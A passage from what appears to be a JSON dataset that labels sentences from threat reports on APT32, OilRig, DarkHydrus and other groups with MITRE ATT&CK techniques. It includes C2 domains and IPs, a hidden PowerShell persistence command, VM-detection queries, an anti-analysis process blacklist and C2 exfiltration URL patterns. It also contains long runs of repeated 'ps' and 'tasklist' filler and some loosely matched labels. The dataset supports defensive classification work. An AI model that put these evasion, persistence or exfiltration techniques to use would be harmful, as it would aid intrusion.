      "If unable to contact the C2 server initially, the shellcode is configured to reattempt communication with the C2 server address in the following pattern: \u00a0[a-z][a-z][a-z].stage.14919005.www1.proslr3[.]com VBScript #2 \u201cmshta.exe\u201d further executes the second VBScript \u201c58d2a83f777908.23270411.vbs\u201d, which creates a folder by GUID name inside \u201cIntel\u201d and drops the VBScript payloads and configuration files: \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777638.60220156.ini \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777688.78384945.ps1 \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f7776b5.64953395.txt \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f7776e0.72726761.vbs \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777716.48248237.vbs \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\58d2a83f777788.86541308.vbs \\Intel\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\Foxconn.lnk This script then executes \u201c58d2a83f777716.48248237.vbs\u201d, which is a variant of FIN7\u2019s HALFBAKED backdoor",
      "To install the payload, the script will create a file %APPDATA%\\OneDrive.bat and save the following string to it: powershell.exe -WindowStyle Hidden -exec bypass\u00a0 -File \u201c%APPDATA%\\OneDrive.ps1\u201d The script then writes a modified copy of itself to %APPDATA%\\OneDrive.ps1, with the code that performs this installation omitted",
      "The executable will drop the packaged QUADAGENT PowerShell script using the filename Office365DCOMCheck.ps1 in addition to a VBScript file with the same filename which will assist in the execution of it"
    ]
  },
  "scheduled task masquerading-multi": {
    "technique_names": ["scheduled task/job", "masquerading"],
    "sentances": [
      "In most lures, one scheduled task persisted an APT32-specific backdoor and the other scheduled task initialized a commercially-available backdoor as backup",
      "Figure 4: APT32 ActiveMime Lures Create Two Named Scheduled Tasks In this example, a scheduled task named \u201cWindows Scheduled Maintenance\u201d was created to run Casey Smith\u2019s \u201cSquiblydoo\u201d App Whitelisting bypass every 30 minutes",
      "A second scheduled task named \u201cScheduled Defrags\u201d was created by loading the raw task XML with a backdated task creation timestamp of June 2, 2016",
      "To create the scheduled task, the PowerShell payload starts by writing the following to a VBScript file with the same name as the task name \u00a0(ex",
      "This DLL file creates a scheduled task named BaiduUpdateTask1, which attempts to run the malicious, spoofed MSBuild.exe every subsequent minute"
    ]
  },
  "indicator removal on host obfuscated files or information-multi": {
    "technique_names": [
      "indicator removal on host",
      "obfuscated files or information"
    ],
    "sentances": [
      "Several Mandiant investigations revealed that, after gaining access, APT32 regularly cleared select event log entries and heavily obfuscated their PowerShell-based tools and shellcode loaders with Daniel Bohannon\u2019s Invoke-Obfuscation framework"
    ]
  },
  "spearphishing link system service discovery account discovery remote system discovery fallback channels windows admin shares-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "system service discovery",
      "account discovery",
      "remote system discovery",
      "fallback channels",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      "C2 Infrastructure  103.53.197.202  104.237.218.70  104.237.218.72  185.157.79.3  193.169.245.78  193.169.245.137  23.227.196.210  24.datatimes.org  80.255.3.87  blog.docksugs.org  blog.panggin.org  contay.deaftone.com  check.paidprefund.org  datatimes.org  docksugs.org  economy.bloghop.org  emp.gapte.name  facebook-cdn.net  gap-facebook.com  gl-appspot.org  help.checkonl.org  high.expbas.net  high.vphelp.net  icon.torrentart.com  images.chinabytes.info  imaps.qki6.com  img.fanspeed.net  job.supperpow.com  lighpress.info  menmin.strezf.com  mobile.pagmobiles.info  news.lighpress.info  notificeva.com  nsquery.net  pagmobiles.info  paidprefund.org  push.relasign.org  relasign.org  share.codehao.net  seri.volveri.net  ssl.zin0.com  static.jg7.org  syn.timeizu.net  teriava.com  timeizu.net  tonholding.com  tulationeva.com  untitled.po9z.com  update-flashs.com  vieweva.com  volveri.net  vphelp.net  yii.yiihao126.net  zone.apize.net   Table 4: Sampling of APT32 C2 Infrastructure"
    ]
  },
  "timestomp deobfuscate/decode files or information-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "deobfuscate/decode files or information"
    ],
    "sentances": [
      "The function builds the contents of a second file by concatenating several strings together, but this second file is a .sct file that the function will write to a file %TEMP%\\12-B-366.txt"
    ]
  },
  "security software discovery virtualization/sandbox evasion-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "The series of commands, as seen in Table 2, include checks for virtualized environments, low memory, and processor counts, in addition to checks for common analysis tools running on the system"
    ]
  },
  "windows management instrumentation permission groups discovery system service discovery network share discovery file deletion virtualization/sandbox evasion query registry remote system discovery-multi": {
    "technique_names": [
      "windows management instrumentation",
      "permission groups discovery",
      "system service discovery",
      "network share discovery",
      "indicator removal on host: file deletion",
      "query registry",
      "remote system discovery",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "PowerShell command Description   \u2018gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%VBOX%'\u201d Query attempts to detect VirtualBox environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%bochs%'\u201d Query attempts to detect Bochs environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%qemu%'\u201d Query attempts to detect QEMU environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%VirtualBox%'\u201d Query attempts to detect VirtualBox environment from the win32_BIOS WMI class   gwmi -query \u201cselect * from win32_BIOS where SMBIOSBIOSVERSION LIKE \u2018%VM%'\u201d Query attempts to detect VMWare environment from the win32_BIOS WMI class   gwmi -query \u201cSelect * from win32_BIOS where Manufacturer LIKE \u2018%XEN%'\u201d Query attempts to detect Xen environment from the win32_BIOS WMI class   gwmi win32_computersystem Uses this query to check the system information for the string \u201cVMware\u201d"
    ]
  },
  "security software discovery process discovery-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "process discovery"
    ],
    "sentances": [
      "Get-Process | select Company Checks to see if any running processes have \u201cWireshark\u201d or \u201cSysinternals\u201d as the company name"
    ]
  },
  "security software discovery virtualization/sandbox evasion system time discovery-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "system time discovery",
      "virtualization/sandbox evasion: system checks"
    ],
    "sentances": [
      "Just like in the sandbox checks, the Trojan checks for an attached debugger each time it issues a DNS query; if it does detect a debugger it will issue a DNS query to resolve 676f6f646c75636b.gogle[.]co"
    ]
  },
  "standard application layer protocol fallback channels-multi": {
    "technique_names": ["application layer protocol", "fallback channels"],
    "sentances": [
      "^testmode Runs the test function to determine which DNS query types can successfully communicate with the C2   ^showconfig Creates a pipe delimited (\u201c|\u201d) string that contains the sample\u2019s settings, including the list of C2 domains and available DNS query types",
      "If the Trojan receives this echo, it will create the following file that the Trojan uses as a signal that it was able to successfully communicate with its C2 server: %APPDATA%\\Windows\\ShwDoc.srv If the Trojan determines the C2 server wishes to send a command, it sends an HTTP request to the following URL: hxxp://www.windowspatch[.]com/tahw?<hex(STDOUT of whoami command)> The Trojan will first check the response to this request for the string spoo, which signifies the C2 does not wish to issue a command",
      "Palo Alto Networks customers are protected from this OilRig attack campaign and OopsIE by:  AutoFocus customers can track this Trojan with the OopsIE tag All known OopsIE samples are marked with malicious verdicts in WildFire All known OopsIE C2 domains have DNS signatures and are classified as Command and Control  \u00a0 Indicators of Compromise OopsIE Trojan 36e66597a3ff808acf9b3ed9bc93a33a027678b1e262707682a2fd1de7731e23 055b7607848777634b2b17a5c51da7949829ff88084c3cb30bcb3e58aae5d8e9 6b240178eedba4ebc9f1c8b56bac02676ce896e609577f4fb64fa977d67c0761 9e8ec04e534db1e714159cc68891be454c2459f179ab1df27d7f89d2b6793b17  OopsIE C2 defender-update[.]com windowspatch[.]com The post OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE appeared first on Palo Alto Networks Blog",
      "Once the QUADAGENT payload has executed, it will use rdppath[.]com as the C2, first via HTTPS, then HTTP, then via DNS tunneling, each being used as a corresponding fallback channel if the former fails",
      "When communicating with its C2 server, the downloaders use multiple protocols, specifically HTTPS, HTTP or DNS, each of which provide a fallback channel in that order",
      "The payload will communicate with its C2 server to obtain the session ID and pre-shared key and write it to this registry key in the following format: \u00a0 <session id>_<pre-shared key> \u00a0 To obtain the session ID and pre-shared key, the payload will first try to contact the C2 via an HTTPS GET request to the following URL: \u00a0 hxxps://www.rdppath[.]com/ \u00a0 If the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no alphanumeric characters, the code will attempt to communicate with the C2 server using HTTP via the following URL: \u00a0 hxxp://www.rdppath[.]com/ \u00a0 The code to communicate with the C2 via HTTP exists within an exception handler",
      "For example, the following string would be included in one of the HTTP parameters sent to the C2 server: eRmaVsr90D-7Ig1ngV3PkdouzP974 In this specific case, the actor made a mistake when configuring this XAgent sample with its C2 locations",
      "The sample creates an array that contains the following strings for the Trojan to use as C2 locations: http://23.227.196[.]215/ http://apple-iclods[.]org/ http://apple-checker[.]org/ http://apple-uptoday[.]org/ http://apple-search[.]info Notice the last one is missing the trailing \u201c/\u201d, which causes an issue when the Trojan attempts to use this string to build the remainder of the C2 URL, as the Trojan will append the next string in the URL directly to this string"
    ]
  },
  "standard application layer protocol access token manipulation-multi": {
    "technique_names": [
      "application layer protocol",
      "access token manipulation"
    ],
    "sentances": [
      "Figure 5 HTTP POST request to obtain an OAUTH access token Figure 5 shows that the Trojan then uses the following regular expression to obtain the access token from the HTTP response: \\\u201daccess_token\\\u201d:(.*) Once authenticated with a valid access token, the Trojan will attempt to upload a file to the Google Drive account"
    ]
  },
  "process discovery": [
    "This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4",
    "The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6\u2026) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place",
    "The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes",
    "Gather domain and account names based on all running processes  Gathering account information from running processes",
    "Visitors are asked to download the \u201cUniversity Of Oxford Job Symposium Pre-Register Tool\u201d:  The downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers: OxfordSymposiumRegTool.exe f77ee804de304f7c3ea6b87824684b33 If run by the victim, their computer would get infected, while they are shown this registration process:    Note that after completing the \u201cregistration process\u201d, the victim is asked to send the form to an email address in\u00a0oxford-careers[.]com, which also belongs to the attackers",
    "Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it",
    "Verifies that there is no process with the name \u201crsyncd\u201d on the active process list (\u201cdbus-inotifier\u201d if the Trojan does not have root privileges)",
    "It searches the active process list for the systemd process",
    "Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted",
    "\u201cwin32_remote\u201c,\u201dwin64_remote64\u201c,\u201dollydbg\u201c,\u201dProcessHacker\u201c,\u201dtcpview\u201c,\u201dautoruns\u201c,\u201dautorunsc\u201c,\u201dfilemon\u201c,\u201dprocmon\u201c,\u201dregmon\u201c,\u201dprocexp\u201c,\u201didaq\u201c,\u201didaq64\u201c,\u201dImmunityDebugger\u201c,\u201dWireshark\u201c,\u201ddumpcap\u201c,\u201dHookExplorer\u201c,\u201dImportREC\u201c,\u201dPETools\u201c,\u201dLordPE\u201c,\u201ddumpcap\u201c,\u201dSysInspector\u201c,\u201dproc_analyzer\u201c,\u201dsysAnalyzer\u201c,\u201dsniff_hit\u201c,\u201dwindbg\u201c,\u201djoeboxcontrol\u201c,\u201djoeboxserver\u201c  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll \u201cNtRaiseHardError\u201d function",
    "This directory will also contain the process id of the running malware in process.id and a \u201cbuild name\u201d (as it is called by the author) in build.id",
    "It is created as a separate process instead of child process of Office applications",
    "Enumerates running processes for \u201cWireshark\u201d and \u201cSysinternals\u201d",
    "What does the Poseidon Group do? What happens after a target machine is infected? Once the target\u2019s machine is compromised, the attacker first enumerates all processes running in the system and all services",
    "78 runin.bin List of processes names and associated plugins should be run inside these processes",
    "The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this \u201c.xlam\u201d file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher",
    "While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.",
    "As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    " lists the running processes",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    "ps ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    " tasklist ",
    "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc."
  ],
  "indicator removal on host: timestomp": [
    "The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \\\u201did\\\u201d:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file",
    "After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file",
    "One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp",
    "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)"
  ],
  "timestomp data staged shortcut modification remote file copy-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "data staged",
      "boot or logon autostart execution: shortcut modification",
      "ingress tool transfer"
    ],
    "sentances": [
      "The Trojan checks the modified time of the file by creating an HTTP request to a URL structured as follows: <Google Drive URL in \u2018gdu\u2019> + <file identifier> + \u201c?supportTeamDrives=true&fields=modifiedTime\u201d The Trojan then uses the following regular expression to obtain the modified time of the file from the HTTP response, which is saved to the variable named modification_time: \\\u201dmodifiedTime\\\u201d:(.*) The Trojan then uploads a second file to the Google Drive, the purpose of which is to allow the Trojan to continually write to this file as it waits for the actor to modify the first file uploaded"
    ]
  },
  "web service remote file copy-multi": {
    "technique_names": ["web service", "ingress tool transfer"],
    "sentances": [
      "In each iteration of the communications loop, the Trojan will check to see if the modification time of the first file changed, and if it is not updated the Trojan will update the second file by writing the string b<unique identifier>c<5 random lowercase characters>.<C2 domain> to the file by creating an HTTP POST request to a URL structured as follows: <Google Drive URL in \u2018gdue\u2019> + <second file identifier> + \u201c?supportsTeamDrive=true&uploadType=resumable&fields=kind,id,name,mimeType,parents\u201d In one RogueRobin sample (SHA256: f1b2bc0831\u2026), the author did not use the Google Drive URL provided by the actor when issuing the x_mode command, and instead included a \u00a0hardcoded Google Drive URL, as seen in Figure 6"
    ]
  },
  "timestomp file and directory discovery remote file copy-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "file and directory discovery",
      "ingress tool transfer"
    ],
    "sentances": [
      "The Trojan downloads the contents of this file by crafting an HTTP request to a URL structured as follows: <Google Drive URL in \u2018gdu\u2019> + <first file identifier> + \u201c?alt=media\u201d With the contents of the file downloaded, the Trojan sets the modification_time variable to the current modification time so the Trojan knows when the actor makes further changes to the file"
    ]
  },
  "access token manipulation": [
    "The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt",
    "Create a process by impersonating a logged-on user  Getting a user token using WTSQueryUserToken",
    "The tokens for each platform are hardcoded within the sample:November 2016 to January 2017: \"Evil New Year\" CampaignIn the early part of 2017, Group123 started the \"Evil New Year\" campaign",
    "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens."
  ],
  "data staged exfiltration over command and control channel exfiltration over alternative protocol data encrypted-multi": {
    "technique_names": [
      "data staged",
      "exfiltration over c2 channel",
      "exfiltration over alternative protocol",
      "data encrypted for impact"
    ],
    "sentances": [
      "When the actor modifies the file and changes the modification_time, the Trojan downloads the contents from the file by creating an HTTP request to a URL structured as follows: <Google Drive URL in \u2018gdu\u2019> + <file identifier in \u2018f_id\u2019> + \u201c?alt=media\u201d The Trojan processes the downloaded data within the file the same way it would to obtain a job from data received from the DNS tunneling channel using the TXT query mode, specifically by searching the data using the following regular expression: ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>) The Trojan function splits the matching data, specifically the subdomain on a separator that is a character between r and v and uses the data before the separator to get the sequence number and a Boolean value (0 or 1) if more data is expected"
    ]
  },
  "system service discovery new service-multi": {
    "technique_names": [
      "system service discovery",
      "create or modify system process"
    ],
    "sentances": [
      "Sample(s) f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0 5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c   DNS tbs1/tbs2.microsoftonline.services   Domains 0ffice365[.]agency    0ffice365[.]life    0ffice365[.]services    0nedrive[.]agency    corewindows[.]agency    microsoftonline[.]agency    onedrive[.]agency    sharepoint[.]agency    skydrive[.]agency    skydrive[.]services   Sample eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97   DNS tvs1/tvs2.trafficmanager.live   Domains akamaiedge[.]live   \u00a0 akamaized[.]live   \u00a0 akdns[.]live   \u00a0 edgekey[.]live    Table 7: Sample and Domain Associations The third cluster of domains had six different nameservers associated with them, but unlike the other two clusters, were all directly tied to each other",
      "Reaver will then install itself as a service in the event it is running with SeDebugPrivilege privileges.\u00a0 The service is configured with a name, description, and display name that is provided within the configuration"
    ]
  },
  "system service discovery new service web service exploitation for client execution network service scanning service execution-multi": {
    "technique_names": [
      "system service discovery",
      "create or modify system process",
      "web service",
      "exploitation for client execution",
      "network service discovery",
      "system services: service execution"
    ],
    "sentances": [
      "Palo Alto Networks customers are already be protected via:  All samples in this report have a malicious verdict in WildFire Domains have been classified as malicious AutoFocus tags are available for additional context: DarkHydrus and RogueRobin  Indicators of Compromise Delivery Document SHA256 513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8 e068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e022 4e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8 RogueRobin SHA256 eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97 f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0 5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c RogueRobin C2s akdns[.]live akamaiedge[.]live edgekey[.]live akamaized[.]live 0ffice365[.]agency 0nedrive[.]agency corewindows[.]agency microsoftonline[.]agency onedrive[.]agency sharepoint[.]agency skydrive[.]agency 0ffice365[.]life 0ffice365[.]services skydrive[.]services skydrive[.]agency Nameservers tvs1.trafficmanager[.]live tvs2.trafficmanager[.]live tbs1.microsoftonline[.]services tbs2.microsoftonline[.]services brit.ns.cloudfronts[.]services dns.cloudfronts[.]services ns2.akadns[.]services britns.akadns[.]services britns.akadns[.]live ns2.akadns[.]live Related Domains iecvlist-microsoft[.]live data-microsoft[.]services asimov-win-microsoft[.]services onecs-live[.]services akamaiedge[.]services phicdn[.]world azureedge[.]today nsatc[.]agency Akamai[.]agency t-msedge[.]world"
    ]
  },
  "credential dumping credentials in files-multi": {
    "technique_names": [
      "os credential dumping",
      "unsecured credentials: credentials in files"
    ],
    "sentances": [
      "\u0627\u0633\u062a\u0637\u0644\u0627\u0639.docx https://0utl00k[.]net/docs    Table 1 Additional DarkHydrus Word documents used to steal credentials Both of these related documents use the attachedTemplate technique to steal credentials by sending them to a URL https://0utl00k[.]net/docs",
      "Additional Features The Zyklon malware offers the following additional capabilities (via plugins): Browser Password Recovery Zyklon HTTP can recover passwords from popular web browsers, including:  Google Chrome Mozilla Firefox Internet Explorer Opera Browser Chrome Canary/SXS CoolNovo Browser Apple Safari Flock Browser SeaMonkey Browser SRWare Iron Browser Comodo Dragon Browser  FTP Password Recovery Zyklon currently supports FTP password recovery from the following FTP applications:  FileZilla SmartFTP FlashFXP FTPCommander Dreamweaver WS_FTP  Gaming Software Key Recovery Zyklon can recover PC Gaming software keys from the following games:  Battlefield Call of Duty FIFA NFS Age of Empires Quake The Sims Half-Life IGI Star Wars  Email Password Recovery Zyklon may also collect email passwords from following applications:  Microsoft Outlook Express Microsoft Outlook 2002/XP/2003/2007/2010/2013 Mozilla Thunderbird Windows Live Mail 2012 IncrediMail, Foxmail v6.x - v7.x Windows Live Messenger MSN Messenger Google Talk GMail Notifier PaltalkScene IM Pidgin (Formerly Gaim) Messenger Miranda Messenger Windows Credential Manager  License Key Recovery The malware automatically detects and decrypts the license/serial keys of more than 200 popular pieces of software, including Office, SQL Server, Adobe, and Nero"
    ]
  },
  "custom cryptographic protocol proxy-multi": {
    "technique_names": ["encrypted channel"],
    "sentances": [
      "RIPTIDE\u2019s first communication with its C2 server fetches an encryption key, and the RC4 encryption key is used to encrypt all further communication",
      "Figure 12: RSA public key 1    Figure 13: RSA public key 2    Figure 14: AES encryption parameters After encryption, the cipher text to be sent over C2 is Base64 encoded"
    ]
  },
  "file and directory discovery exploitation for client execution-multi": {
    "technique_names": [
      "file and directory discovery",
      "exploitation for client execution"
    ],
    "sentances": [
      "MD5 File Name Exploit 73f493f6a2b0da23a79b50765c164e88 \u8b70\u7a0b\u6700\u65b0\u4fee\u6b63\u53ca\u6ce8\u610f\u4e8b\u9805.doc CVE-2012-0158 f6fafb7c30b1114befc93f39d0698560 0824.1.doc CVE-2012-0158 eaa6e03d9dae356481215e3a9d2914dc \u7c21\u6613\u540d\u518a0\u5168\u570b\u5404\u8b66\u5bdf\u6a5f\u95dc\u4e3b\u5b98\u81f3\u5206\u5c40\u9577.doc CVE-2012-0158 06da4eb2ab6412c0dc7f295920eb61c4 \u9644\u6a94.doc CVE-2012-0158 53baedf3765e27fb465057c48387c9b6 103\u5e74\u7b2c3\u5c46\u901a\u8a0a\u9304.doc CVE-2012-0158 00a95fb30be2d6271c491545f6c6a707 2014 09 17 Welcome Reception for Bob and Jason_invitation.doc CVE-2012-0158 4ab6bf7e6796bb930be2dd0141128d06 \u7522\u8aee\u6703_Y103(2)\u59d4\u54e1\u6703_\u5f9e\u6771\u5354\u65b0\u8208\u570b\u5bb6\u5d1b\u8d77(0825).doc CVE-2012-0158   Figure 4: Identified exploit documents for HIGHTIDE\u00a0 When the file is opened, it drops HIGHTIDE in the form of an executable file onto the infected system",
      "Month File Name or Decoy Document Theme Suspected Target Region   Nov 2017 The NSA Telenor.doc Unknown Pakistan   Oct 2017 Circulars.doc dollar.doc Pakistan Federal Investigation Agency CV of Middle Eastern Civil Servant Turkey Pakistan \u00a0   Sep 2017 Iraq National Intelligence Service Kaspersky Security solution 2017.doc Iraq  Aug 2017 Arab Emirate \u0633\u0631\u06cc.docm Iraq Commission of Integrity Arab Emirates  Jul 2017 Requirements of the Sago.doc CommIT-Document.doc Confidential letters.doc Saudi Arabia Arab Emirates Pakistan   Jun 2017 Iraq Kurdistan Regional Government RFP_VOIP.doc Iraq  May 2017 RFP.doc Requirement.doc Iraq Kurdistan Regional Government Georgia Iraq   Mar 2017 court.doc Georgia   Feb 2017 CERT-Audit-20172802-GEO.xls Georgia  Table 1 \u2013 Examples of the lure documents observed in the MuddyWater attacks"
    ]
  },
  "application window discovery fallback channels-multi": {
    "technique_names": ["application window discovery", "fallback channels"],
    "sentances": [
